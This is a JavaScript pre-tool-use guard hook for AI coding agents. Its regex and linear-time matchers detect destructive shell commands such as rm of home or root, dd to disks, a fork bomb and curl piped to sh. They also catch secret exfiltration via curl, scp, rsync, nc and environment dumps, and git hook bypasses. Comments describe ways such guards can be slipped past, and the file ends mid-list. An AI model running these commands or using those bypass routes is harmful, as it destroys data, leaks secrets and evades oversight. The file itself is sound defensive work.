#!/usr/bin/env node
/**
 * guard.js — PreToolUse guard for Claude Code
 * Matcher: Bash|Read|Edit|Write
 * Codex CLI also runs it for apply_patch (Write/Edit are matcher aliases there): every
 * path in the patch gets the Write/Edit checks.
 *
 * Layers, each toggleable via the constants below:
 *   1. DANGEROUS_COMMANDS  — DENY catastrophic / destructive Bash
 *   2. SECRET_EXFIL        — DENY Bash that uploads/leaks secrets
 *   3. SECRET_FILES        — DENY Read/Edit/Write of secret files (hard block, everywhere)
 *   4. SQL_GUARD           — ASK (confirm) before destructive SQL (DROP/TRUNCATE/DELETE-all/UPDATE-all)
 *
 * Decisions: layers 1-3 "deny" (hard block). Layer 4 "ask" — Claude Code shows a
 * confirmation dialog so you can approve a legitimate drop, but nothing runs silently.
 *
 * Codex CLI treats "ask" as unsupported and runs the call. On Codex (detected from the hook
 * payload, see isCodexPayload) the asks from patch checks and guard-integrity checks become
 * denies; careful-mode and SQL asks stay asks, which Codex ignores.
 *
 * Escape hatches (env vars, per-shell):
 *   KEYSTONE_GUARD_OFF=1              — disable ALL layers for this session
 *   KEYSTONE_ALLOW_SECRETS=1         — relax ONLY the secret-file layer (keep command + exfil protection)
 *
 * Fails closed: hook input that isn't valid JSON returns "ask", and so does an internal error
 * (on a Codex payload, "deny"), rather than allowing the call. A tool guard doesn't check
 * gets "{}".
 * No file logging by design — the deny reason is surfaced inline to you and Claude.
 *
 * Wiring (settings.json):
 *   "PreToolUse": [{
 *     "matcher": "Bash|Read|Edit|Write",
 *     "hooks": [{ "type": "command", "command": "node ~/.claude/hooks/guard.js", "timeout": 5 }]
 *   }]
 */

"use strict";

const fs = require("fs");
const os = require("os");
const path = require("path");
// Loaded defensively: a crash at require time would exit 1, which harnesses treat as a
// non-blocking error, letting EVERY tool call through. Without it, patches are denied.
let patchPaths = null;
try {
  patchPaths = require("./patch-paths.js");
} catch (_) {
  patchPaths = null;
}

// ── Layer toggles ────────────────────────────────────────────────────────────
const DANGEROUS_COMMANDS = true;
const SECRET_EXFIL = true;
const SECRET_FILES = true;
const SQL_GUARD = true;
// Layer 0 (freeze / careful) is opt-in per machine via the user-only /guard skill
// (/guard freeze|careful|on|off), which writes ~/.claude/keystone-guard.json. Absent file ⇒ baseline behavior.
const GUARD_STATE_FILE =
  process.env.KEYSTONE_GUARD_FILE ||
  path.join(os.homedir(), ".claude", "keystone-guard.json");

// ── Files explicitly safe to access (templates / examples) ───────────────────
// Each regex is anchored to the END of a single path. For Read/Edit/Write it is tested
// against the file path; for Bash it is tested per shell word (see neutralizeAllowlisted),
// never against the whole command — a whole-command test let `<anything> # .env.example`
// skip every deny layer. No `g` flag: .test() with `g` carries lastIndex between calls.
const ALLOWLIST = [
  /\.env\.example$/i,
  /\.env\.sample$/i,
  /\.env\.template$/i,
  /\.env\.schema$/i,
  /\.env\.defaults$/i,
  /(^|\/)example\.env$/i,
];

// ── Linear-time matchers ─────────────────────────────────────────────────────
// A hook timeout lets Codex run the call unchecked, so no rule may backtrack super-linearly
// on long input. Every rule whose regex backtracked super-linearly (cubic or quadratic in
// the input length; 33 Bash rules and 2 secret-file patterns) runs through one of these
// instead, with the same decisions: guard.redos.test.js checks each against its original. Each answers "does
// some match exist" in one pass, using next-index tables instead of backtracking.
const isWordCode = (c) => (c >= 48 && c <= 57) || (c >= 65 && c <= 90) || (c >= 97 && c <= 122) || c === 95; // \w
const isSepCode = (c) => c === 59 || c === 124 || c === 38; // ; | &
const isLineTermCode = (c) => c === 10 || c === 13 || c === 0x2028 || c === 0x2029; // what . excludes
const JS_SPACE = new Set([
  9, 10, 11, 12, 13, 32, 0xa0, 0x1680, 0x2028, 0x2029, 0x202f, 0x205f, 0x3000, 0xfeff,
  ...Array.from({ length: 11 }, (_, i) => 0x2000 + i),
]); // /\s/
const asciiLower = (s) => s.replace(/[A-Z]+/g, (m) => m.toLowerCase()); // keeps every index

/** next[p] = smallest index q >= p with ok(q), or n when there is none. */
function nextTable(n, ok) {
  const next = new Int32Array(n + 2).fill(n);
  for (let p = n - 1; p >= 0; p--) next[p] = ok(p) ? p : next[p + 1];
  return next;
}

/** Does a SECRET_TOKENS match start at p? (lowercased input) */
function secretTokenAt(lo, p) {
  return secretTokenEnd(lo, p) !== -1;
}
function environTokenAt(lo, p) {
  return ["os.environ", "process.env", "env.to_h", "deno.env"].some((t) => lo.startsWith(t, p));
}

/**
 * Matcher for /\b(INTERP)\b[^;|&]*(-c|-e)\b.*TOKEN/i: an interpreter word, then (with no
 * ; | & in between) a -c/-e flag ending at a word boundary, then a token later on the same
 * line as the flag. `.` stops at a line terminator but may cross ; | &.
 */
function interpOneLiner(interps, tokenAt) {
  const names = new Set(interps);
  const quick = new RegExp(interps.join("|"), "i"); // no interpreter name, no match
  const test = (s) => {
    if (!quick.test(s)) return false;
    const lo = asciiLower(String(s));
    const n = lo.length;
    // tokenAhead[p]: a token starts at some k >= p with no line terminator in [p, k).
    const tokenAhead = new Uint8Array(n + 2);
    for (let p = n - 1; p >= 0; p--) {
      tokenAhead[p] = tokenAt(lo, p) || (!isLineTermCode(lo.charCodeAt(p)) && tokenAhead[p + 1]) ? 1 : 0;
    }
    const flag = nextTable(n, (j) =>
      lo.charCodeAt(j) === 45 && // -
      (lo[j + 1] === "c" || lo[j + 1] === "e") &&
      !isWordCode(lo.charCodeAt(j + 2)) &&
      tokenAhead[j + 2] === 1,
    );
    const sep = nextTable(n, (p) => isSepCode(lo.charCodeAt(p)));
    // \b(name)\b is exactly a maximal \w run equal to a name.
    for (let a = 0; a < n; ) {
      if (!isWordCode(lo.charCodeAt(a))) { a++; continue; }
      let b = a;
      while (b < n && isWordCode(lo.charCodeAt(b))) b++;
      if (b - a <= 7 && names.has(lo.slice(a, b)) && flag[b] < sep[b]) return true;
      a = b;
    }
    return false;
  };
  return { test, source: `linear: (${interps.join("|")}) … -c|-e … token` };
}

/**
 * Matcher for /\bcp\s+[^;|&]*-\S*[rR]\S*f|\bcp\s+[^;|&]*-\S*f\S*[rR]/: `cp` at a word
 * start, whitespace, then (with no ; | & in between) a `-` whose following run of non-space
 * characters holds both an r/R and an f, in either order.
 */
function cpRecursiveForce(s) {
  s = String(s);
  if (!s.includes("cp")) return false;
  const n = s.length;
  const hasR = new Uint8Array(n + 2);
  const hasF = new Uint8Array(n + 2);
  for (let p = n - 1; p >= 0; p--) {
    const c = s.charCodeAt(p);
    if (JS_SPACE.has(c)) continue; // both stay 0: the run ends here
    hasR[p] = c === 114 || c === 82 || hasR[p + 1] ? 1 : 0;
    hasF[p] = c === 102 || hasF[p + 1] ? 1 : 0;
  }
  const dash = nextTable(n, (j) => s.charCodeAt(j) === 45 && hasR[j + 1] === 1 && hasF[j + 1] === 1);
  const sep = nextTable(n, (p) => isSepCode(s.charCodeAt(p)));
  for (let a = s.indexOf("cp"); a !== -1; a = s.indexOf("cp", a + 1)) {
    const c = a + 2;
    if (a > 0 && isWordCode(s.charCodeAt(a - 1))) continue;
    if (c < n && JS_SPACE.has(s.charCodeAt(c)) && dash[c] < sep[c]) return true;
  }
  return false;
}

/** Smallest end of a SECRET_TOKENS match starting at p (credentials? → "credential"), or -1. */
function secretTokenEnd(lo, p) {
  const bounded = (tok) => lo.startsWith(tok, p) && !isWordCode(lo.charCodeAt(p + tok.length));
  let end = -1;
  const take = (e) => { if (end === -1 || e < end) end = e; };
  if (bounded(".env") || bounded(".pem") || bounded(".key")) take(p + 4);
  for (const t of ["credential", "secret", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", ".aws/credentials"]) {
    if (lo.startsWith(t, p)) take(p + t.length);
  }
  return end;
}

/** An atom for segmentChain: a sticky regex, returning the end of its match at p or -1. */
function atom(re) {
  const y = new RegExp(re.source, re.flags.replace(/[gy]/g, "") + "y");
  const at = (s, lo, p) => {
    y.lastIndex = p;
    return y.test(s) ? y.lastIndex : -1;
  };
  at.anywhere = new RegExp(re.source, re.flags.replace(/[gy]/g, "")); // for a quick pre-check
  return at;
}
const TOKEN_ATOM = (s, lo, p) => secretTokenEnd(lo, p);

/**
 * Matcher for A0 [^;|&]* A1 [^;|&]* … Ak, where no atom can contain ; | &, so a match lies
 * inside one ;|&-free segment. Within a segment, taking the earliest-ending occurrence of
 * each atom in turn is optimal (it leaves the most room for the rest), so one left-to-right
 * pass decides it. Atoms return the SMALLEST end of a match at a position.
 */
function segmentChain(atoms, source) {
  const test = (s) => {
    s = String(s);
    if (atoms[0].anywhere && !atoms[0].anywhere.test(s)) return false; // first atom absent
    const lo = asciiLower(s);
    const n = s.length;
    let k = 0;
    let p = 0;
    while (p <= n) {
      let best = -1;
      let q = p;
      for (; q < n && !isSepCode(s.charCodeAt(q)); q++) {
        if (best !== -1 && q >= best) break; // a later start cannot end sooner
        const e = atoms[k](s, lo, q);
        if (e !== -1 && (best === -1 || e < best)) best = e;
      }
      if (best === -1) {
        while (q < n && !isSepCode(s.charCodeAt(q))) q++;
        k = 0; // restart the chain in the next segment
        p = q + 1;
        continue;
      }
      if (++k === atoms.length) return true;
      p = best;
    }
    return false;
  };
  return { test, source: `linear chain: ${source}` };
}

/**
 * Matcher for PREFIX GAP REST, where GAP is a run of characters for which inGap() holds. A
 * match from a later PREFIX in the same gap run can be restarted from the earlier PREFIX (its
 * GAP absorbs everything in between), so the full regex is tried once, sticky, per run.
 * REST must cost O(1) per position for this to be linear; PREFIX must not end in an
 * unbounded run that overlaps GAP (write `\s[^…]*`, not the equivalent `\s+[^…]*`).
 */
function perRun(re, prefix, inGap) {
  const full = new RegExp(re.source, re.flags.replace(/[gy]/g, "") + "y");
  const pre = new RegExp(prefix.source, prefix.flags.replace(/[gy]/g, "") + "g");
  const test = (s) => {
    s = String(s);
    const n = s.length;
    let bad = null; // bad[i]: characters outside GAP in s[0, i); built on the first prefix
    let tried = -1;
    pre.lastIndex = 0;
    for (let m = pre.exec(s); m !== null; m = pre.exec(s)) {
      const p = m.index;
      const e = p + m[0].length;
      pre.lastIndex = p + 1;
      if (!bad) {
        bad = new Int32Array(n + 1);
        for (let i = 0; i < n; i++) bad[i + 1] = bad[i] + (inGap(s.charCodeAt(i)) ? 0 : 1);
      }
      if (tried !== -1 && tried <= e && bad[e] === bad[tried]) continue; // covered by `tried`
      full.lastIndex = p;
      if (full.test(s)) return true;
      tried = e;
    }
    return false;
  };
  return { test, source: re.source, flags: re.flags };
}
const notLineTerm = (c) => !isLineTermCode(c); // the `.` class
const notSep = (c) => !isSepCode(c);

/** Tables over JS \s shared by the rm and git matchers. */
function wsTables(s) {
  const n = s.length;
  const isWs = (i) => i < n && JS_SPACE.has(s.charCodeAt(i));
  const wsEnd = new Int32Array(n + 1); // first non-space index >= i
  const wordEnd = new Int32Array(n + 1); // first space index >= i
  wsEnd[n] = n;
  wordEnd[n] = n;
  for (let i = n - 1; i >= 0; i--) {
    wsEnd[i] = isWs(i) ? wsEnd[i + 1] : i;
    wordEnd[i] = isWs(i) ? i : wordEnd[i + 1];
  }
  // flagChain[p]: where (?:-\S+\s+)* starting at p stops. \S+ must run to the next space and
  // \s+ must take the whole space run (what follows is a flag or a target, never a space).
  const flagChain = new Int32Array(n + 1);
  flagChain[n] = n;
  for (let p = n - 1; p >= 0; p--) {
    flagChain[p] = p;
    if (s.charCodeAt(p) === 45 && p + 1 < n && !isWs(p + 1)) {
      const w = wordEnd[p + 1];
      if (w < n) flagChain[p] = flagChain[wsEnd[w]];
    }
  }
  return { isWs, wsEnd, flagChain };
}

/**
 * Matcher for /\brm\s+(?:-\S+\s+)*TAIL/ where TAIL never starts with `-` or a space: after
 * `rm` and its spaces, TAIL can only start where the flag chain ends.
 */
function rmFlagsThen(tail, source) {
  const t = new RegExp(tail.source, tail.flags.replace(/[gy]/g, "") + "y");
  const test = (s) => {
    s = String(s);
    if (!s.includes("rm")) return false;
    const { isWs, wsEnd, flagChain } = wsTables(s);
    for (let a = s.indexOf("rm"); a !== -1; a = s.indexOf("rm", a + 1)) {
      if ((a > 0 && isWordCode(s.charCodeAt(a - 1))) || !isWs(a + 2)) continue;
      t.lastIndex = flagChain[wsEnd[a + 2]];
      if (t.test(s)) return true;
    }
    return false;
  };
  return { test, source: `linear: ${source}` };
}

/**
 * Matcher for /\brm\s+.+\s+["']?(~\/?|\$HOME)["']?(\s*$|[;&|])/, simulated as a 4-state
 * NFA (after rm / in \s+ / in .+ / in the second \s+), one step per character.
 */
function rmHomeTrail(s) {
  s = String(s);
  if (!s.includes("rm")) return false;
  const n = s.length;
  const allWsToEnd = new Uint8Array(n + 1);
  allWsToEnd[n] = 1;
  for (let i = n - 1; i >= 0; i--) allWsToEnd[i] = JS_SPACE.has(s.charCodeAt(i)) && allWsToEnd[i + 1] ? 1 : 0;
  const isQuote = (i) => s[i] === '"' || s[i] === "'";
  const tailAt = (p) => {
    for (const q1 of isQuote(p) ? [p, p + 1] : [p]) {
      const cores = [];
      if (s[q1] === "~") cores.push(q1 + 1), s[q1 + 1] === "/" && cores.push(q1 + 2);
      if (s.startsWith("$HOME", q1)) cores.push(q1 + 5);
      for (const c of cores) {
        for (const q2 of isQuote(c) ? [c, c + 1] : [c]) {
          if (allWsToEnd[q2] || (q2 < n && isSepCode(s.charCodeAt(q2)))) return true;
        }
      }
    }
    return false;
  };
  let S0 = false, S1 = false, S2 = false, S3 = false;
  for (let p = 0; p <= n; p++) {
    if (S3 && tailAt(p)) return true;
    if (p === n) break;
    if (s.startsWith("rm", p - 2) && p >= 2 && (p === 2 || !isWordCode(s.charCodeAt(p - 3)))) S0 = true;
    const c = s.charCodeAt(p);
    const ws = JS_SPACE.has(c);
    const lt = isLineTermCode(c);
    const n1 = (S0 && ws) || (S1 && ws);
    const n2 = (S1 && !lt) || (S2 && !lt);
    const n3 = (S2 && ws) || (S3 && ws);
    S0 = false;
    S1 = n1;
    S2 = n2;
    S3 = n3;
  }
  return false;
}

/**
 * Matcher for /\bgit\s+push\b(?!.*--force-with-lease).*(?:--force|\s-f)\b.*\b(main|master)\b/.
 * `.` stops at a line terminator, but `\s-f` may consume one, so the branch name may sit on
 * the next line.
 */
function forcePushMain(s) {
  s = String(s);
  if (!/\bgit\s+push\b/.test(s)) return false;
  const n = s.length;
  const word = (i) => i >= 0 && i < n && isWordCode(s.charCodeAt(i));
  const lineEnd = nextTable(n, (i) => isLineTermCode(s.charCodeAt(i)));
  const lease = nextTable(n, (i) => s.startsWith("--force-with-lease", i));
  const branchAt = (k) =>
    !word(k - 1) && ((s.startsWith("main", k) && !word(k + 4)) || (s.startsWith("master", k) && !word(k + 6)));
  const branchAhead = new Uint8Array(n + 2); // a branch word at k >= p with no line break before it
  for (let p = n - 1; p >= 0; p--) {
    branchAhead[p] = branchAt(p) || (!isLineTermCode(s.charCodeAt(p)) && branchAhead[p + 1]) ? 1 : 0;
  }
  const goodForce = nextTable(n, (f) =>
    (s.startsWith("--force", f) && !word(f + 7) && branchAhead[f + 7] === 1) ||
    (JS_SPACE.has(s.charCodeAt(f)) && s.startsWith("-f", f + 1) && !word(f + 3) && branchAhead[f + 3] === 1),
  );
  const pre = /\bgit\s+push\b/g;
  for (let m = pre.exec(s); m !== null; m = pre.exec(s)) {
    pre.lastIndex = m.index + 1;
    const e = m.index + m[0].length;
    const line = lineEnd[e];
    if (lease[e] < line) continue; // (?!.*--force-with-lease)
    const f = goodForce[e];
    if (f < n && f <= line) return true;
  }
  return false;
}

/**
 * Matcher for /\bgit\s+(?:checkout|switch)\s+(?:-\S+\s+)*(?:main|master)(?![\w./-])[\s\S]*
 * \bgit\b[^;|&\n]*\bmerge(?![\w-])/.
 */
function gitMergeIntoMain(s) {
  s = String(s);
  if (!s.includes("merge") || !/\bgit\s+(?:checkout|switch)\s/.test(s)) return false;
  const n = s.length;
  const word = (i) => i >= 0 && i < n && isWordCode(s.charCodeAt(i));
  const { isWs, wsEnd, flagChain } = wsTables(s);
  const segBreak = (i) => isSepCode(s.charCodeAt(i)) || s.charCodeAt(i) === 10;
  const mergeAhead = new Uint8Array(n + 2);
  for (let p = n - 1; p >= 0; p--) {
    const here = !word(p - 1) && s.startsWith("merge", p) && !word(p + 5) && s[p + 5] !== "-";
    mergeAhead[p] = here || (!segBreak(p) && mergeAhead[p + 1]) ? 1 : 0;
  }
  const mergeAfterGit = new Uint8Array(n + 2); // some \bgit\b … merge starts at g >= p
  for (let p = n - 1; p >= 0; p--) {
    const here = !word(p - 1) && s.startsWith("git", p) && !word(p + 3) && mergeAhead[p + 3] === 1;
    mergeAfterGit[p] = here || mergeAfterGit[p + 1] ? 1 : 0;
  }
  for (let a = s.indexOf("git"); a !== -1; a = s.indexOf("git", a + 1)) {
    if (word(a - 1) || !isWs(a + 3)) continue;
    const q = wsEnd[a + 3];
    const verb = s.startsWith("checkout", q) ? 8 : s.startsWith("switch", q) ? 6 : 0;
    if (!verb || !isWs(q + verb)) continue;
    const k = flagChain[wsEnd[q + verb]];
    const len = s.startsWith("main", k) ? 4 : s.startsWith("master", k) ? 6 : 0;
    if (!len) continue;
    const after = s[k + len];
    if (after !== undefined && (word(k + len) || after === "." || after === "/" || after === "-")) continue;
    if (mergeAfterGit[k + len]) return true;
  }
  return false;
}

/**
 * Matcher for /\bcurl\b[^;|&]*(-d\s*@|-F\s+[^=]+=@|--data[^=]*=@|--upload-file|-T)\s*
 * [^;|&]*SECRET_TOKENS/i. The -F and --data forms run to their first `=` (which may lie
 * past a ; | &), so each flag position has exactly one possible end.
 */
function curlUpload(s) {
  s = String(s);
  if (!/\bcurl\b/i.test(s)) return false;
  const lo = asciiLower(s);
  const n = s.length;
  const isWs = (i) => i < n && JS_SPACE.has(s.charCodeAt(i));
  const nextEq = nextTable(n, (i) => s.charCodeAt(i) === 61);
  const wsEnd = new Int32Array(n + 1);
  wsEnd[n] = n;
  for (let i = n - 1; i >= 0; i--) wsEnd[i] = isWs(i) ? wsEnd[i + 1] : i;
  const tokenInSeg = new Uint8Array(n + 2); // a token starts at k >= p with no ; | & before it
  for (let p = n - 1; p >= 0; p--) {
    tokenInSeg[p] = secretTokenEnd(lo, p) !== -1 || (!isSepCode(lo.charCodeAt(p)) && tokenInSeg[p + 1]) ? 1 : 0;
  }
  const flagEnd = (a) => {
    if (lo[a] !== "-") return -1;
    if (lo[a + 1] === "d") return lo[wsEnd[a + 2]] === "@" ? wsEnd[a + 2] + 1 : -1;
    if (lo[a + 1] === "f") {
      if (!isWs(a + 2)) return -1;
      const q = nextEq[a + 3];
      return q < n && q >= a + 4 && lo[q + 1] === "@" ? q + 2 : -1;
    }
    if (lo[a + 1] === "t") return a + 2;
    if (lo.startsWith("--upload-file", a)) return a + 13;
    if (lo.startsWith("--data", a)) {
      const q = nextEq[a + 6];
      return q < n && lo[q + 1] === "@" ? q + 2 : -1;
    }
    return -1;
  };
  const goodFlag = nextTable(n, (a) => {
    const e = flagEnd(a);
    return e !== -1 && tokenInSeg[e] === 1;
  });
  const sep = nextTable(n, (p) => isSepCode(lo.charCodeAt(p)));
  for (let a = 0; a < n; ) {
    if (!isWordCode(lo.charCodeAt(a))) { a++; continue; }
    let b = a;
    while (b < n && isWordCode(lo.charCodeAt(b))) b++;
    if (b - a === 4 && lo.startsWith("curl", a) && goodFlag[b] < sep[b]) return true;
    a = b;
  }
  return false;
}

/**
 * Matcher for /PREFIX(?![^;]*\bWHERE\b)/i: some PREFIX match with no WHERE word after it
 * before the next `;`. The lookahead rescanned the rest of the statement from every PREFIX
 * (quadratic); a right-to-left table answers it once per position.
 */
function noWhereAfter(prefix, source) {
  const pre = new RegExp(prefix.source, prefix.flags.replace(/[gy]/g, "") + "g");
  const quick = new RegExp(prefix.source, prefix.flags.replace(/[gy]/g, ""));
  const test = (s) => {
    s = String(s);
    if (!quick.test(s)) return false;
    const lo = asciiLower(s);
    const n = lo.length;
    const word = (i) => i >= 0 && i < n && isWordCode(lo.charCodeAt(i));
    const whereAhead = new Uint8Array(n + 2); // a \bWHERE\b starts at k >= p with no ; before it
    for (let p = n - 1; p >= 0; p--) {
      const here = !word(p - 1) && lo.startsWith("where", p) && !word(p + 5);
      whereAhead[p] = here || (lo.charCodeAt(p) !== 59 && whereAhead[p + 1]) ? 1 : 0;
    }
    pre.lastIndex = 0;
    for (let m = pre.exec(s); m !== null; m = pre.exec(s)) {
      pre.lastIndex = m.index + 1;
      if (!whereAhead[m.index + m[0].length]) return true;
    }
    return false;
  };
  return { test, source: `linear: ${source}` };
}

/**
 * Matcher for /service[_-]?account[^/]*\.json$/i: the path ends in `.json`, and
 * service[_-]?account occurs in its last segment, ending at or before that `.json`.
 */
function gcpServiceAccount(s) {
  const lo = asciiLower(String(s));
  if (!lo.endsWith(".json")) return false;
  const stop = lo.length - 5; // where the final `.json` starts
  return /service[_-]?account/.test(lo.slice(lo.lastIndexOf("/", stop - 1) + 1, stop));
}

/** Matcher for /(?:^|\/)\.config\/gcloud\/.*(credential|token)/i. */
function gcloudCreds(s) {
  const lo = asciiLower(String(s));
  if (!lo.includes(".config/gcloud/")) return false;
  const n = lo.length;
  const tokenAhead = new Uint8Array(n + 2); // credential|token at k >= p, no line break before it
  for (let p = n - 1; p >= 0; p--) {
    const here = lo.startsWith("credential", p) || lo.startsWith("token", p);
    tokenAhead[p] = here || (!isLineTermCode(lo.charCodeAt(p)) && tokenAhead[p + 1]) ? 1 : 0;
  }
  for (let k = lo.indexOf(".config/gcloud/"); k !== -1; k = lo.indexOf(".config/gcloud/", k + 1)) {
    if ((k === 0 || lo[k - 1] === "/") && tokenAhead[k + 15]) return true;
  }
  return false;
}

// ── Layer 1: dangerous Bash commands ─────────────────────────────────────────
const DANGEROUS = [
  {
    id: "rm-home",
    re: rmFlagsThen(/["']?(~\/?|\$HOME)["']?(\s|$|[;&|])/, "rm-home"),
    why: "rm targeting home directory",
  },
  {
    id: "rm-home-trail",
    re: { test: rmHomeTrail, source: "linear NFA: rm-home-trail" },
    why: "rm with trailing ~/ or $HOME",
  },
  {
    id: "rm-root",
    re: rmFlagsThen(/\/(\*|\s|$|[;&|])/, "rm-root"),
    why: "rm targeting root filesystem",
  },
  {
    id: "rm-system",
    re: rmFlagsThen(/\/(etc|usr|var|bin|sbin|lib|boot|dev|proc|sys)(\/|\s|$)/, "rm-system"),
    why: "rm targeting system directory",
  },
  {
    id: "rm-cwd",
    re: rmFlagsThen(/(\.\/?|\*|\.\/\*)(\s|$|[;&|])/, "rm-cwd"),
    why: "rm deleting current directory contents",
  },
  {
    id: "dd-disk",
    re: perRun(/\bdd\b.+\bof=\/dev\/(sd[a-z]|nvme|hd[a-z]|vd[a-z]|xvd[a-z]|disk\d)/, /\bdd\b/, notLineTerm),
    why: "dd writing to a disk device",
  },
  { id: "mkfs", re: /\bmkfs(\.\w+)?\s+\/dev\//, why: "mkfs formatting a disk" },
  {
    id: "fork-bomb",
    re: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
    why: "fork bomb",
  },
  {
    id: "curl-pipe-sh",
    re: perRun(/\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|d)?sh\b/, /\b(curl|wget)\b/, (c) => c !== 124),
    why: "piping a URL straight into a shell (RCE risk)",
  },
  {
    id: "force-push-main",
    re: { test: forcePushMain, source: "linear: force-push-main" },
    why: "force-push to main/master",
  },
  {
    id: "reset-hard",
    re: /\bgit\s+reset\s+--hard\b/,
    why: "git reset --hard discards uncommitted work",
  },
  {
    id: "git-clean-f",
    re: /\bgit\s+clean\s+(-\S*f|\S*-f)\S*/,
    why: "git clean -f deletes untracked files",
  },
  {
    id: "chmod-777",
    re: perRun(/\bchmod\b.+\b777\b/, /\bchmod\b/, notLineTerm),
    why: "chmod 777 is a security risk",
  },
  {
    id: "crontab-r",
    re: /\bcrontab\s+-r\b/,
    why: "crontab -r removes all cron jobs",
  },
  {
    id: "git-no-verify",
    re: segmentChain(
      [atom(/\bgit\b/), atom(/\b(commit|push|merge|cherry-pick|rebase|am)\b/), atom(/--no-verify\b/)],
      "git … commit|push|… … --no-verify",
    ),
    why: "git --no-verify skips pre-commit/commit-msg/pre-push hooks (quality-gate bypass)",
  },
  {
    id: "git-commit-n-short",
    re: segmentChain([atom(/\bgit\s+commit\b/), atom(/\s-n(?:\s|$)/)], "git commit … -n"),
    why: "git commit -n skips commit hooks (drop -n, or set KEYSTONE_GUARD_OFF=1 if intended)",
  },
  {
    id: "git-hookspath-override",
    re: segmentChain([atom(/\bgit\b/i), atom(/-c\s+core\.hooksPath=/i)], "git … -c core.hooksPath="),
    why: "git -c core.hooksPath= overrides/disables repo hooks",
  },
];

// ── Layer 2: secret exfiltration / exposure via Bash ─────────────────────────
// SECRET_TOKENS (secretTokenEnd) is the alternation the rules below share:
// (\.env\b|credentials?|secrets?|id_rsa|id_ed25519|id_ecdsa|id_dsa|\.pem\b|\.key\b|\.aws\/credentials), /i.
const EXFIL = [
  {
    id: "curl-upload",
    re: { test: curlUpload, source: "linear: curl-upload" },
    why: "uploading secrets via curl",
  },
  {
    id: "curl-post",
    re: segmentChain([atom(/\bcurl\b/i), atom(/-X\s*POST/i), TOKEN_ATOM], "curl … -X POST … token"),
    why: "POSTing secrets via curl",
  },
  {
    id: "wget-post",
    re: segmentChain([atom(/\bwget\b/i), atom(/--post-file/i), TOKEN_ATOM], "wget … --post-file … token"),
    why: "POSTing secrets via wget",
  },
  {
    id: "scp-secrets",
    re: segmentChain([atom(/\bscp\b/i), TOKEN_ATOM, atom(/[^;|&]/), atom(/:/)], "scp … token … :"),
    why: "copying secrets off-box via scp",
  },
  {
    id: "rsync-secrets",
    re: segmentChain([atom(/\brsync\b/i), TOKEN_ATOM, atom(/[^;|&]/), atom(/:/)], "rsync … token … :"),
    why: "syncing secrets off-box via rsync",
  },
  {
    id: "nc-secrets",
    re: segmentChain([atom(/\bnc\b/i), atom(/</), TOKEN_ATOM], "nc … < … token"),
    why: "exfiltrating secrets via netcat",
  },
  {
    id: "read-env",
    re: segmentChain(
      [atom(/\b(cat|less|more|head|tail|bat|view|nl|xxd|od|strings)\s/i), atom(/\.env\b/i)],
      "cat|less|… … .env",
    ),
    why: "reading a .env file exposes secrets",
  },
  {
    id: "read-key",
    re: segmentChain(
      [atom(/\b(cat|less|more|head|tail|bat|view)\s/i), atom(/(id_rsa|id_ed25519|id_ecdsa|id_dsa|\.pem|\.key)\b/i)],
      "cat|less|… … key file",
    ),
    why: "reading a private key",
  },
  {
    id: "read-aws",
    re: segmentChain(
      [atom(/\b(cat|less|more|head|tail|bat)\s/i), atom(/\.aws\/credentials/i)],
      "cat|less|… … .aws/credentials",
    ),
    why: "reading AWS credentials",
  },
  {
    id: "source-env",
    // \s+[^|;&]* is the same language as \s[^|;&]*, and keeps the prefix fixed-width.
    re: perRun(/(\bsource\s|(?:^|[;&|]\s*)\.\s)[^|;&]*\.env\b/i, /\bsource\s|(?:^|[;&|]\s*)\.\s/i, notSep),
    why: "sourcing .env loads secrets into the environment",
  },
  {
    id: "env-dump",
    re: /\bprintenv\b|(?:^|[;&|]\s*)env\s*(?:$|[;&|])/,
    why: "env dump may expose secrets",
  },
  {
    // Case-sensitive + uppercase-only: secret env vars are UPPER_SNAKE by
    // convention, so this catches $API_KEY / $DB_PASSWORD without tripping on
    // lowercase loop vars like $key or $keys (which bit legitimate scripts).
    id: "echo-secret",
    re: segmentChain(
      [
        atom(/\b(echo|printf)\b/),
        atom(/\$\{?[A-Z_]*(SECRET|API[_-]?KEY|\bKEY\b|TOKEN|PASSWORD|PASSWD|CREDENTIAL|PRIVATE|AUTH)/),
      ],
      "echo|printf … $SECRET-like variable",
    ),
    why: "printing a secret variable",
  },
  {
    id: "proc-environ",
    re: /\/proc\/[^/]+\/environ/,
    why: "reading a process environment block",
  },
  {
    id: "base64-secret",
    re: segmentChain([atom(/\bbase64\b/i), TOKEN_ATOM], "base64 … token"),
    why: "base64-encoding a secret (exfil prep)",
  },
  {
    // Was /\b(python3?|node|deno|bun|ruby|perl)\b[^;|&]*(-c|-e)\b.*SECRET_TOKENS/i, which
    // backtracks cubically; same decision, linear time (see interpOneLiner).
    id: "interp-secret",
    re: interpOneLiner(["python", "python3", "node", "deno", "bun", "ruby", "perl"], secretTokenAt),
    why: "interpreter one-liner reading a secret file",
  },
  {
    // Was /\b(python3?|node|deno|bun|ruby)\b[^;|&]*(-c|-e)\b.*(os\.environ|process\.env|
    // ENV\.to_h|Deno\.env)/i; same decision, linear time.
    id: "interp-environ",
    re: interpOneLiner(["python", "python3", "node", "deno", "bun", "ruby"], environTokenAt),
    why: "interpreter one-liner dumping the environment",
  },
];

// ── Layer 3: secret files (Read/Edit/Write) ──────────────────────────────────
const SECRET_FILE_PATTERNS = [
  {
    id: "env-file",
    re: /(?:^|\/)\.env(?:\.[^/]*)?$/,
    why: ".env file contains secrets",
  },
  {
    id: "envrc",
    re: /(?:^|\/)\.envrc$/,
    why: ".envrc (direnv) contains secrets",
  },
  {
    id: "ssh-key",
    re: /(?:^|\/)(id_rsa|id_ed25519|id_ecdsa|id_dsa)$/,
    why: "SSH private key",
  },
  {
    id: "ssh-key-path",
    re: /(?:^|\/)\.ssh\/id_[^/]+$/,
    why: "SSH private key",
  },
  {
    id: "ssh-authkeys",
    re: /(?:^|\/)\.ssh\/authorized_keys$/,
    why: "SSH authorized_keys",
  },
  { id: "pem", re: /\.pem$/i, why: "PEM key/cert file" },
  { id: "key", re: /\.key$/i, why: "key file" },
  { id: "pkcs12", re: /\.(p12|pfx)$/i, why: "PKCS#12 key bundle" },
  {
    id: "aws-creds",
    re: /(?:^|\/)\.aws\/credentials$/,
    why: "AWS credentials",
  },
  {
    id: "aws-config",
    re: /(?:^|\/)\.aws\/config$/,
    why: "AWS config may contain secrets",
  },
  {
    id: "kube-config",
